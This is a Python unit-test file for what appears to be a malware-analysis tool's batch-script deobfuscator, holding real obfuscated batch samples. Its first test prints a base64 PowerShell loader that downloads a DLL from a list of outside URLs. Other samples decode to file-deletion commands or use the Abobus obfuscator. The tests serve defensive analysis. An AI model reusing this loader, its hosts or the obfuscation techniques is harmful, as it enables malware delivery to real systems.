from .. import TestUnitBase

from inspect import getdoc
from unittest import skip


def multiline(obj):
    return getdoc(obj) or ''


class TestBAT(TestUnitBase):

    def test_maldoc_extracted_bat_loader(self):
        xlx = self.download_sample('9472b3a4b2394975087d9ce9ce5b855de21f9fb7f98f17f3a973b1fd11959705')
        xtr = self.ldu('xlxtr', 'B115', 'B116')
        bat = self.load()
        out = B'\n'.join(xlx | xtr) | bat | [str]
        self.assertIn(
            'start /B /WAIT powershell -enc JABqAGUAbwBsAGkAcwBlADMAUgBoAGcARABaAFMANABjAGQAZ'
            'gBnAD0AIgBoAHQAdABwADoALwAvAGcAbwB5AGEAbAB1AGEAdAAuAHYAbQBlAHMAaAAuAGkAbgAvADAAd'
            'gA2AGsAYwBuAHkALwBDAEcALwAsAGgAdAB0AHAAcwA6AC8ALwBtAGEAcgBzAC4AcwByAGwALwB3AHAAL'
            'QBhAGQAbQBpAG4ALwA3AEYAZgBrADYATABMAE4AMgBYAHMAMgBXAC8ALABoAHQAdABwADoALwAvAGYAc'
            'gBhAG4AbQB1AGwAZQByAG8ALgBlAHMALwBtAGIAeAAvADgAYwA1AFIAQgBKAHgANgAvACwAaAB0AHQAc'
            'AA6AC8ALwB2AGEAcgBhAGYAbwBvAGQALgBjAG8AbQAvAEEAagBhAHgALwBjAG4ATQA5ADEARwAvACwAa'
            'AB0AHQAcABzADoALwAvADcAagBjAGEAdAAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHQAL'
            'wAsAGgAdAB0AHAAOgAvAC8AYgBsAG8AZwAuAGMAZQBuAHQAcgBhAGwAaABvAG0AZQAuAGgAdQAvAHcAc'
            'AAtAGMAbwBuAHQAZQBuAHQALwBwAEIAMQBSAGYAUABDAG4AQgBsAFMAMQBXAGYAcABjAE8ATAAvACwAa'
            'AB0AHQAcAA6AC8ALwB6AGkAbQByAGkAZwBoAHQAcwAuAGMAbwAuAHoAdwAvAG8AbABkAHMAaQB0AGUAL'
            'wBrADAARQBvAEMAVwB5AGMAVQA5AHQATgBvADEAZAAvACwAaAB0AHQAcABzADoALwAvAG0AdQBkAGgAY'
            'QBuAGQAcwAuAGMAbwBtAC8AZQByAHIAbwByAC8AQgBmAEgALwAsAGgAdAB0AHAAOgAvAC8AYQBsAGIAY'
            'QB0AHIAbwBzAHAAYQB0AGEAZwBvAG4AaQBhAC4AYwBvAG0ALwBwAGgAawBjAHYAdAAvAHQANQAzAGMAZ'
            'QBTAE0ARABxAGcAUABRAGwAcQAvACwAaAB0AHQAcAA6AC8ALwBtAGEAcABjAG8AbQBtAHUAbgBpAGMAY'
            'QB0AGkAbwBuAHMALgBjAG8ALgB6AHcALwB3AHAALQBhAGQAbQBpAG4ALwBtAGQAUgBSAGIAUwBkAFUAM'
            'wBhAEIANwBYAHAAeAA2AHoALwAsAGgAdAB0AHAAOgAvAC8AbwBkAGMAbwBuAHMAdQBsAHQALgBjAG8AL'
            'gB1AGsALwBBAEwARgBBAF8ARABBAFQAQQAvAEgASAByADAARgBxAE8AWABBAG4ANgAyAC8ALABoAHQAd'
            'ABwADoALwAvAGQAdQBzAGgAawBpAG4ALgBuAGUAdAAvAGkAbQBnAC8AYgBoAFEAUwBUAE4AaQBjAEUAT'
            'QB0AE4AUQB4AFAALwAiAC4AcwBwAEwAaQBUACgAIgAsACIAKQA7AGYATwByAGUAYQBDAGgAKAAkAGoAZ'
            'AB0AEYASgBkAFgAaAByADYAdAB4AHkAaABkACAAaQBuACAAJABqAGUAbwBsAGkAcwBlADMAUgBoAGcAR'
            'ABaAFMANABjAGQAZgBnACkAewAkAHIAaAB5AGsAYQBqAGQAaABmAHMANwBpAGQAZgBnAGQAPQAiAGMAO'
            'gBcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAHYAYgBrAHcAawAuAGQAbABsACIAOwBpAE4AdgBPAGsAZ'
            'QAtAHcARQBiAHIAZQBRAHUAZQBzAFQAIAAtAHUAUgBpACAAJABqAGQAdABGAEoAZABYAGgAcgA2AHQAe'
            'AB5AGgAZAAgAC0AbwB1AFQAZgBpAEwAZQAgACQAcgBoAHkAawBhAGoAZABoAGYAcwA3AGkAZABmAGcAZ'
            'AA7AGkAZgAoAHQAZQBzAHQALQBwAEEAdABIACAAJAByAGgAeQBrAGEAagBkAGgAZgBzADcAaQBkAGYAZ'
            'wBkACkAewBpAGYAKAAoAGcAZQB0AC0AaQBUAGUAbQAgACQAcgBoAHkAawBhAGoAZABoAGYAcwA3AGkAZ'
            'ABmAGcAZAApAC4ATABlAG4AZwB0AGgAIAAtAGcAZQAgADQANQAwADAAMAApAHsAYgByAGUAYQBrADsAf'
            'QB9AH0A', out)

    def test_real_world_01(self):
        data = self.download_sample('6a1bc124f945ddfde62b4137d627f3958b23d8a2a6507e3841cab84416c54eea')
        deob = data | self.load() | str
        test = deob | self.ldu('xtp', 'url') | {str}
        self.assertSetEqual(test, {
            'https'R':'R'//pastebin'R'.'R'com/raw/bLnD8FWX',
            'https'R':'R'//pastebin'R'.'R'com/raw/EZ88t5c1',
        })

    def test_blog_post_example_01(self):
        @multiline
        class batch:
            R'''
            set wjdk=set
            %wjdk% gwdoy= 
            %wjdk%%gwdoy%ipatx==
            %wjdk%%gwdoy%mqhofe%ipatx%es
            %wjdk%%gwdoy%dppmto%ipatx%*
            %wjdk%%gwdoy%qqou%ipatx%Da
            %wjdk%%gwdoy%jpsfhg%ipatx%i
            %wjdk%%gwdoy%ellpj%ipatx%1
            %wjdk%%gwdoy%mtbrob%ipatx%g
            %wjdk%%gwdoy%owmdn%ipatx%xe
            %wjdk%%gwdoy%xhpnnd%ipatx%R
            %wjdk%%gwdoy%lgqwon%ipatx%b4.
            %wjdk%%gwdoy%tqwnuq%ipatx%***
            %wjdk%%gwdoy%hhemc%ipatx%u
            %wjdk%%gwdoy%onqdwr%ipatx%60
            %wjdk%%gwdoy%xjbgb%ipatx%*
            %wjdk%%gwdoy%trpjq%ipatx%303
            %wjdk%%gwdoy%jwdub%ipatx%nt
            %wjdk%%gwdoy%papbet%ipatx%t
            %wjdk%%gwdoy%dmhljv%ipatx%min
            %wjdk%%gwdoy%lkjmj%ipatx%C:
            %wjdk%%gwdoy%hwagtv%ipatx%I
            %wjdk%%gwdoy%ximgny%ipatx%App
            %wjdk%%gwdoy%dblcjy%ipatx%***
            %wjdk%%gwdoy%hbjewj%ipatx%de
            %wjdk%%gwdoy%yatty%ipatx%b8
            %wjdk%%gwdoy%tbqci%ipatx%li
            %wjdk%%gwdoy%fbakxo%ipatx%**
            %wjdk%%gwdoy%drwc%ipatx%131
            %wjdk%%gwdoy%skmxb%ipatx%Use
            %wjdk%%gwdoy%wttahx%ipatx%st
            %wjdk%%gwdoy%nmdl%ipatx%5
            %wjdk%%gwdoy%rulr%ipatx%e
            %wjdk%%gwdoy%opflr%ipatx%o
            %wjdk%%gwdoy%blel%ipatx%ti
            %wjdk%%gwdoy%wbyt%ipatx%a
            %wjdk%%gwdoy%exiy%ipatx%r
            %wjdk%%gwdoy%yxbqxf%ipatx%s
            %wjdk%%gwdoy%ntqi%ipatx%\
            %wjdk%%gwdoy%jngoq%ipatx%ar
            %wttahx%%jngoq%%papbet%%gwdoy%%lkjmj%%ntqi%%skmxb%%exiy%%yxbqxf%%ntqi%%dppmto%%dblcjy%%xjbgb%%fbakxo%%tqwnuq%%ntqi%%ximgny%%qqou%%papbet%%wbyt%%ntqi%%xhpnnd%%opflr%%wbyt%%dmhljv%%mtbrob%%ntqi%%hwagtv%%hbjewj%%jwdub%%jpsfhg%%blel%%mqhofe%%ellpj%%onqdwr%%trpjq%%drwc%%nmdl%%ntqi%%hhemc%%tbqci%%yatty%%lgqwon%%rulr%%owmdn%
            '''
        test = batch | self.load() | str
        self.assertIn('Identities1603031315', test)

    def test_blog_post_example_02(self):
        @multiline
        class batch:
            R'''
            set a=cadmin
            set b=led
            set c=\
            %b:~2,1%el %a:~0,1%:%c%%a:~1,1%dmi%a:~5,1%
            '''
        test = batch | self.load() | str
        self.assertIn(R'del c:\admin', test)

    def test_blog_post_example_03(self):
        @multiline
        class batch:
            R'''
            set a=pdfcondelpdfcon pdfconpdfconpdfconpdfconpdfconpdfconCpdfconpdfconpdfconpdfcon:pdfconpdfcon\pdfconpdfconpdfconApdfcondmpdfconpdfconpdfconpdfconipdfconn
            %a:pdfcon=%
            '''
        test = batch | self.load() | str
        self.assertIn(R'del C:\Admin', test)

    def test_abobus_frontpage(self):
        @multiline
        class batch:
            R'''
            ;@;@@(@ch^c%æ³•å‡¡æ–‡ç„¡è¢«^æ³•%p%è²¼^æ˜¯è£½æ˜¯å­—è­·%.c%å‡¡å·²äººè¨Š^é€™ä¸Š%om 43^7)>n^ul&@e%é­”æ³•ä¸Šä¿ç¥^äºº%%ä¿å‡¡è­·ä¸Šäººè¢«^%%äººç¥æ–‡æ³•^è¢«ä¸Š%^cho o%å­—çš„ä¿è£½^ä¿é€™%f^%å‡¡è¡Œäººè¡Œè£½^æ³•%f&c%é€™å‡¡è­·ç„¡^æ–‡æ³•%%é­”ç¥^å­—è£½æ¯è­·%^ls&&s%Øª^â—¯ØªØ³ï­²ï»%e^%Ø³ï®¢ï­«^â—¯ïº–ï¯”%t ill%ï¯¤^ï­²ÙƒØªØªï»%llii^%ïº¹ï­²^ï®¢ï­«ï®±ïº¼%i%ï®¢ïº¹ï»ïº¼ïº–Øª^%iii=%0&s^e%ï®±Øªï®•ï®šï­²ï®±^%%ï»ï¯”^Ùƒï­²ï®šï®š%t ğ§½= ï¿½c
            @:ABOBUS-OBFUSCATOR

            ;SE^T "__author__=EscaLag"
            ;SE^T "__github__=github.com/EscaLag/Abobus-obfuscator"

            ; ;@s^%é­”é€™è¢«æ­¤^è¨Šä¸Š%e%ç„¡^è¨Šç„¡è£½äººå­—%t /a â€+=1 >n^uL &F^o%æ­¤è£½é­”è¨Š^ä¸Šå·²%%çš„æ³•^è¨Šå­—äººå­—%r %%a in ( s%ï®¢^ï®šïº¼ï¯”Ùƒï®•%%ï·½ï®¢^ïº¹â—¯ï¯”ï·½%^et g%è£½çš„è¨Šé­”è²¼^æ³•%^%è£½ç§˜^è¢«è¨Šç„¡ç§˜%%å­—è£½äºº^ç¥æ˜¯äºº%oto e%(â—•^â€¿â—•)(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜(â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)%c%â”Œ(^ à² _à² )â”˜(â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)â”Œ( à² _à² )â”˜(âŠ™Ï‰âŠ™)%h^%(âŠ™Ï‰âŠ™)(â—•â€¿â—•)(âŠ™Ï‰âŠ™)ãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)ãƒ¾^(âŒâ– _â– )ãƒ%o pau%â”Œ( à² _à² )â”˜(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)(^âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)%^s%â”Œ( à² _à² )â”˜(â—•â€¿â—•)(â—•â€¿â—•)(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜(âŠ™Ï‰âŠ™)^%%(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•^)(âŠ™Ï‰âŠ™)%e )do @f%äººä¿ä¿è¨Š^å·²æ­¤%%é­”è¢«é€™é€™æ–‡å‡¡^%^inds%ç„¡æ¯ç¥å·²^å‡¡ç„¡%tr /L /I %%a %iLllLiiiIii%&&e%çš„å‡¡å­—æ³•æ–‡å·²^%x^%ç¥æ³•æ³•ç§˜è²¼ç¥^%i%è­·äººä¸Š^æ˜¯æ³•æ­¤%t
            @%PUblic:~4,1%%PUblic:~5,1%t "åŸƒè€»å°”é˜¿=SD1p3zX%PUblic:~14,1%Rk%PUblic:~9,1%75%PUblic:~0,1%oa8t%PUblic:~3,1%FfK2%PUblic:~4,1%TndVQmW%PUblic:~11,1%OLYAwGxgv9yMEq%PUblic:~12,1%jI%PUblic:~13,1%0N4Jh%PUblic:~10,1%%PUblic:~6,1%%PUblic:~5,1%6Z B@=H"
            @f%(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)(â—•â€¿â—•)â”Œ( à² _à² )â”˜â”Œ( à² _à² )â”˜â”Œ^( à² _à² )â”˜%i^%(^â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ%n%ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)â”Œ( à² _à² )â”˜â”Œ( à² _à² )^â”˜%d >n^UL 2>&1&&f^o%è£½ä¿äºº^é­”è¡Œè¡Œ%%è£½ä¸Š^äººå·²è­·è¨Š%R /l %%c iN (.)do (@e%è¤‡ä¿ç§˜^æ³•è¡Œå­—%c^%æ–‡^è¢«è¢«ä¿æ–‡ä¿%h%ç„¡ç¥ç§˜è­·æ¯å·²^%o AB%å‡¡å‡¡ç„¡ä¿æ³•æ˜¯^%O^B%æ³•é­”ç¥ä¸Š^è¡Œæ³•%U%è¤‡å·²ä¿^ä¿ç„¡è¤‡%S O^%ïº–â—¯Ùƒï·½ïº–^ï®š%B%ï»ï®•^ï¯¤ïº–ïº¼ï»%FUSCAT%ï»ï­²^ï®¢ïº¹ï¯”ï·½%ION)||@exi%(âŠ™Ï‰âŠ™)ãƒ¾(âŒâ– _â– )ãƒ(^â—•â€¿â—•)(â—•â€¿â—•)(â—•â€¿â—•)(â—•â€¿â—•)%^%ãƒ¾(âŒâ– _â– )ãƒâ”Œ( à² _à² )â”˜(â—•â€¿^â—•)(â—•â€¿â—•)(â—•â€¿â—•)(âŠ™Ï‰âŠ™)%%â”Œ( à² _à² )â”˜^(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)%t
            @@%åŸƒè€»å°”é˜¿:~62,1%%åŸƒè€»å°”é˜¿:~23,1%%åŸƒè€»å°”é˜¿:~57,1%%åŸƒè€»å°”é˜¿:~17,1% "é¥¿è±†æ–¯ç»´%åŸƒè€»å°”é˜¿:~63,1%%åŸƒè€»å°”é˜¿:~56,1%%åŸƒè€»å°”é˜¿:~62,1%%åŸƒè€»å°”é˜¿:~6,1%%åŸƒè€»å°”é˜¿:~31,1%%åŸƒè€»å°”é˜¿:~58,1%%åŸƒè€»å°”é˜¿:~0,1%%åŸƒè€»å°”é˜¿:~9,1%%åŸƒè€»å°”é˜¿:~17,1%%åŸƒè€»å°”é˜¿:~4,1%%åŸƒè€»å°”é˜¿:~26,1%%åŸƒè€»å°”é˜¿:~12,1%%åŸƒè€»å°”é˜¿:~7,1%%åŸƒè€»å°”é˜¿:~64,1%%åŸƒè€»å°”é˜¿:~15,1%%åŸƒè€»å°”é˜¿:~61,1%%åŸƒè€»å°”é˜¿:~43,1%%åŸƒè€»å°”é˜¿:~63,1%%åŸƒè€»å°”é˜¿:~50,1%%åŸƒè€»å°”é˜¿:~48,1%%åŸƒè€»å°”é˜¿:~27,1%%åŸƒè€»å°”é˜¿:~53,1%%åŸƒè€»å°”é˜¿:~34,1%%åŸƒè€»å°”é˜¿:~55,1%%åŸƒè€»å°”é˜¿:~44,1%%åŸƒè€»å°”é˜¿:~25,1%%åŸƒè€»å°”é˜¿:~3,1%%åŸƒè€»å°”é˜¿:~5,1%%åŸƒè€»å°”é˜¿:~51,1%%åŸƒè€»å°”é˜¿:~24,1%%åŸƒè€»å°”é˜¿:~10,1%%åŸƒè€»å°”é˜¿:~37,1%%åŸƒè€»å°”é˜¿:~16,1%%åŸƒè€»å°”é˜¿:~14,1%%åŸƒè€»å°”é˜¿:~35,1%%åŸƒè€»å°”é˜¿:~32,1%%åŸƒè€»å°”é˜¿:~46,1%%åŸƒè€»å°”é˜¿:~13,1%%åŸƒè€»å°”é˜¿:~41,1%%åŸƒè€»å°”é˜¿:~8,1%%åŸƒè€»å°”é˜¿:~28,1%%åŸƒè€»å°”é˜¿:~20,1%%åŸƒè€»å°”é˜¿:~21,1%%åŸƒè€»å°”é˜¿:~22,1%%åŸƒè€»å°”é˜¿:~29,1%%åŸƒè€»å°”é˜¿:~11,1%%åŸƒè€»å°”é˜¿:~57,1%%åŸƒè€»å°”é˜¿:~60,1%%åŸƒè€»å°”é˜¿:~38,1%%åŸƒè€»å°”é˜¿:~18,1%%åŸƒè€»å°”é˜¿:~23,1%%åŸƒè€»å°”é˜¿:~1,1%%åŸƒè€»å°”é˜¿:~39,1%%åŸƒè€»å°”é˜¿:~47,1%%åŸƒè€»å°”é˜¿:~19,1%%åŸƒè€»å°”é˜¿:~40,1%%åŸƒè€»å°”é˜¿:~54,1%%åŸƒè€»å°”é˜¿:~36,1%%åŸƒè€»å°”é˜¿:~2,1%%åŸƒè€»å°”é˜¿:~52,1%%åŸƒè€»å°”é˜¿:~59,1%%åŸƒè€»å°”é˜¿:~45,1%%åŸƒè€»å°”é˜¿:~30,1%%åŸƒè€»å°”é˜¿:~33,1%%åŸƒè€»å°”é˜¿:~49,1%%åŸƒè€»å°”é˜¿:~42,1%"
            ;@;@s^e%è£½è¨Šè¤‡^è¢«ç§˜è¢«%%å­—è¨Šè£½ç§˜æ–‡è¤‡^%t /a â€+=1 >n^UL &F%(â—•â€¿â—•)(â—•â€¿â—•)â”Œ( à² _à² )â”˜(^â—•â€¿â—•)â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ%%â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)^ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ%o^R /l %%i iN (1 1 1) do F%(â—•â€¿â—•)(â—•â€¿â—•)â”Œ( à² _à² )â”˜(^â—•â€¿â—•)â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ%%â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)^ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ%o^R %%a iN ( il%(âŠ™Ï‰âŠ™)(â—•â€¿â—•)â”Œ( à² _à² )â”˜ãƒ¾(âŒ^â– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ%%ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)(âŠ™^Ï‰âŠ™)(â—•â€¿â—•)(â—•â€¿â—•)%llliii^ii%â”Œ( à² _à² )â”˜(âŠ™Ï‰âŠ™)ãƒ¾^(âŒâ– _â– )ãƒãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)â”Œ( à² _à² )â”˜%i _%ïº–^ï®•â—¯ïº¼ï®•ï®•%_%ïº¹Ùƒï®±ï·½^ï»ï®±%%ï®šï­²^ï®šï­«ï®šïº¼%author^__ _^_gi%è¢«è£½é€™å·²^ç„¡äºº%%è¢«é­”ç§˜ä¸Š^è­·é€™%%è¤‡^å·²ç„¡äººæ–‡å‡¡%thub__)do i^f no%ãƒ¾(âŒâ– _â– )ãƒ^â”Œ( à² _à² )â”˜(â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒâ”Œ( à² _à² )â”˜(â—•â€¿â—•)%^%(â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒ(â—•â€¿â—•)ãƒ¾(âŒâ– _â– ^)ãƒ%t de%â”Œ( à² _à² )â”˜(â—•â€¿â—•)â”Œ(^ à² _à² )â”˜(â—•â€¿â—•)(â—•â€¿â—•)(âŠ™Ï‰âŠ™)%%(âŠ™Ï‰âŠ™^)â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)(â—•â€¿â—•)(âŠ™Ï‰âŠ™)%f%(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)(^â—•â€¿â—•)(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜ãƒ¾(âŒâ– _â– )ãƒ%iN^ed %%a ex%ç§˜ç¥æ¯æ­¤^é­”æ–‡%%ä¿ç¥æ¯é­”è¨Š^è¨Š%i^%äººé­”^çš„çš„æ–‡è£½%t
            @@%é¥¿è±†æ–¯ç»´:~1,1%%é¥¿è±†æ–¯ç»´:~49,1%%é¥¿è±†æ–¯ç»´:~45,1%%é¥¿è±†æ–¯ç»´:~7,1% "è‰¾åŸƒå…‹è´%é¥¿è±†æ–¯ç»´:~16,1%%é¥¿è±†æ–¯ç»´:~31,1%%é¥¿è±†æ–¯ç»´:~32,1%%é¥¿è±†æ–¯ç»´:~40,1%%é¥¿è±†æ–¯ç»´:~39,1%%é¥¿è±†æ–¯ç»´:~36,1%%é¥¿è±†æ–¯ç»´:~58,1%%é¥¿è±†æ–¯ç»´:~60,1%%é¥¿è±†æ–¯ç»´:~30,1%%é¥¿è±†æ–¯ç»´:~52,1%%é¥¿è±†æ–¯ç»´:~21,1%%é¥¿è±†æ–¯ç»´:~27,1%%é¥¿è±†æ–¯ç»´:~46,1%%é¥¿è±†æ–¯ç»´:~56,1%%é¥¿è±†æ–¯ç»´:~20,1%%é¥¿è±†æ–¯ç»´:~17,1%%é¥¿è±†æ–¯ç»´:~35,1%%é¥¿è±†æ–¯ç»´:~57,1%%é¥¿è±†æ–¯ç»´:~18,1%%é¥¿è±†æ–¯ç»´:~61,1%%é¥¿è±†æ–¯ç»´:~41,1%%é¥¿è±†æ–¯ç»´:~9,1%%é¥¿è±†æ–¯ç»´:~48,1%%é¥¿è±†æ–¯ç»´:~29,1%%é¥¿è±†æ–¯ç»´:~54,1%%é¥¿è±†æ–¯ç»´:~51,1%%é¥¿è±†æ–¯ç»´:~50,1%%é¥¿è±†æ–¯ç»´:~33,1%%é¥¿è±†æ–¯ç»´:~15,1%%é¥¿è±†æ–¯ç»´:~8,1%%é¥¿è±†æ–¯ç»´:~53,1%%é¥¿è±†æ–¯ç»´:~23,1%%é¥¿è±†æ–¯ç»´:~2,1%%é¥¿è±†æ–¯ç»´:~25,1%%é¥¿è±†æ–¯ç»´:~62,1%%é¥¿è±†æ–¯ç»´:~10,1%%é¥¿è±†æ–¯ç»´:~5,1%%é¥¿è±†æ–¯ç»´:~38,1%%é¥¿è±†æ–¯ç»´:~55,1%%é¥¿è±†æ–¯ç»´:~26,1%%é¥¿è±†æ–¯ç»´:~22,1%%é¥¿è±†æ–¯ç»´:~64,1%%é¥¿è±†æ–¯ç»´:~49,1%%é¥¿è±†æ–¯ç»´:~16,1%%é¥¿è±†æ–¯ç»´:~12,1%%é¥¿è±†æ–¯ç»´:~37,1%%é¥¿è±†æ–¯ç»´:~47,1%%é¥¿è±†æ–¯ç»´:~4,1%%é¥¿è±†æ–¯ç»´:~44,1%%é¥¿è±†æ–¯ç»´:~1,1%%é¥¿è±†æ–¯ç»´:~24,1%%é¥¿è±†æ–¯ç»´:~63,1%%é¥¿è±†æ–¯ç»´:~19,1%%é¥¿è±†æ–¯ç»´:~42,1%%é¥¿è±†æ–¯ç»´:~7,1%%é¥¿è±†æ–¯ç»´:~59,1%%é¥¿è±†æ–¯ç»´:~34,1%%é¥¿è±†æ–¯ç»´:~28,1%%é¥¿è±†æ–¯ç»´:~14,1%%é¥¿è±†æ–¯ç»´:~3,1%%é¥¿è±†æ–¯ç»´:~11,1%%é¥¿è±†æ–¯ç»´:~43,1%%é¥¿è±†æ–¯ç»´:~0,1%%é¥¿è±†æ–¯ç»´:~13,1%%é¥¿è±†æ–¯ç»´:~6,1%%é¥¿è±†æ–¯ç»´:~45,1%"
            @@e%é€™å·²æ˜¯æ–‡å·²^ç„¡%^%å­—ç§˜é€™^æ³•æ³•è¡Œ%%äºº^ç„¡ç¥å­—æ­¤è²¼%cho>tmp&@f%(âŠ™Ï‰âŠ™)ãƒ¾(âŒâ– _â– )ãƒãƒ¾(âŒâ– _^â– )ãƒ(âŠ™Ï‰âŠ™)â”Œ( à² _à² )â”˜â”Œ( à² _à² )â”˜%^O%(â—•â€¿â—•)ãƒ¾(âŒâ– _â– )ãƒ(âŠ™Ï‰âŠ™)(âŠ™Ï‰âŠ™)(â—•â€¿â—•)â”Œ( à² _^à² )â”˜%r /f "tokens=3" %%i iN ('t^%Ø³â—¯Øªï®šØªïº¼^%yp%ïº–ÙƒØªï¯”ï®•^ï®š%%Ø³Ùƒï­²ï¯”ï»ï®±^%e tmp')DO i^f "%%i" E%è²¼ç§˜ä¸Š^è­·è¢«æ³•%%ç„¡è¤‡é€™ç¥è¡Œ^è²¼%Q^U "on." (@ex%ä¿å·²ä¸Š^çš„ç¥ç„¡%%æ¯è¤‡äººäºº^ç§˜æ¯%i%é€™^ç§˜æ˜¯æ­¤ç¥æ¯%^t) else (@d^%å­—é€™æ³•è¡Œ^äººæ­¤%%å·²æ˜¯æ˜¯^æ­¤æ³•å·²%el /f/q tmp)
            @@%è‰¾åŸƒå…‹è´:~48,1%%è‰¾åŸƒå…‹è´:~41,1%%è‰¾åŸƒå…‹è´:~64,1%%è‰¾åŸƒå…‹è´:~53,1% "ç»´è‰¾çˆ±é˜¿%è‰¾åŸƒå…‹è´:~42,1%%è‰¾åŸƒå…‹è´:~47,1%%è‰¾åŸƒå…‹è´:~30,1%%è‰¾åŸƒå…‹è´:~17,1%%è‰¾åŸƒå…‹è´:~49,1%%è‰¾åŸƒå…‹è´:~28,1%%è‰¾åŸƒå…‹è´:~55,1%%è‰¾åŸƒå…‹è´:~36,1%%è‰¾åŸƒå…‹è´:~5,1%%è‰¾åŸƒå…‹è´:~29,1%%è‰¾åŸƒå…‹è´:~19,1%%è‰¾åŸƒå…‹è´:~13,1%%è‰¾åŸƒå…‹è´:~57,1%%è‰¾åŸƒå…‹è´:~40,1%%è‰¾åŸƒå…‹è´:~11,1%%è‰¾åŸƒå…‹è´:~2,1%%è‰¾åŸƒå…‹è´:~14,1%%è‰¾åŸƒå…‹è´:~62,1%%è‰¾åŸƒå…‹è´:~43,1%%è‰¾åŸƒå…‹è´:~12,1%%è‰¾åŸƒå…‹è´:~25,1%%è‰¾åŸƒå…‹è´:~37,1%%è‰¾åŸƒå…‹è´:~35,1%%è‰¾åŸƒå…‹è´:~26,1%%è‰¾åŸƒå…‹è´:~27,1%%è‰¾åŸƒå…‹è´:~53,1%%è‰¾åŸƒå…‹è´:~45,1%%è‰¾åŸƒå…‹è´:~58,1%%è‰¾åŸƒå…‹è´:~44,1%%è‰¾åŸƒå…‹è´:~24,1%%è‰¾åŸƒå…‹è´:~63,1%%è‰¾åŸƒå…‹è´:~34,1%%è‰¾åŸƒå…‹è´:~1,1%%è‰¾åŸƒå…‹è´:~48,1%%è‰¾åŸƒå…‹è´:~56,1%%è‰¾åŸƒå…‹è´:~15,1%%è‰¾åŸƒå…‹è´:~46,1%%è‰¾åŸƒå…‹è´:~8,1%%è‰¾åŸƒå…‹è´:~33,1%%è‰¾åŸƒå…‹è´:~61,1%%è‰¾åŸƒå…‹è´:~18,1%%è‰¾åŸƒå…‹è´:~20,1%%è‰¾åŸƒå…‹è´:~32,1%%è‰¾åŸƒå…‹è´:~59,1%%è‰¾åŸƒå…‹è´:~23,1%%è‰¾åŸƒå…‹è´:~64,1%%è‰¾åŸƒå…‹è´:~3,1%%è‰¾åŸƒå…‹è´:~38,1%%è‰¾åŸƒå…‹è´:~39,1%%è‰¾åŸƒå…‹è´:~54,1%%è‰¾åŸƒå…‹è´:~60,1%%è‰¾åŸƒå…‹è´:~10,1%%è‰¾åŸƒå…‹è´:~31,1%%è‰¾åŸƒå…‹è´:~22,1%%è‰¾åŸƒå…‹è´:~16,1%%è‰¾åŸƒå…‹è´:~9,1%%è‰¾åŸƒå…‹è´:~52,1%%è‰¾åŸƒå…‹è´:~41,1%%è‰¾åŸƒå…‹è´:~42,1%%è‰¾åŸƒå…‹è´:~50,1%%è‰¾åŸƒå…‹è´:~0,1%%è‰¾åŸƒå…‹è´:~7,1%%è‰¾åŸƒå…‹è´:~6,1%%è‰¾åŸƒå…‹è´:~21,1%%è‰¾åŸƒå…‹è´:~51,1%%è‰¾åŸƒå…‹è´:~4,1%"
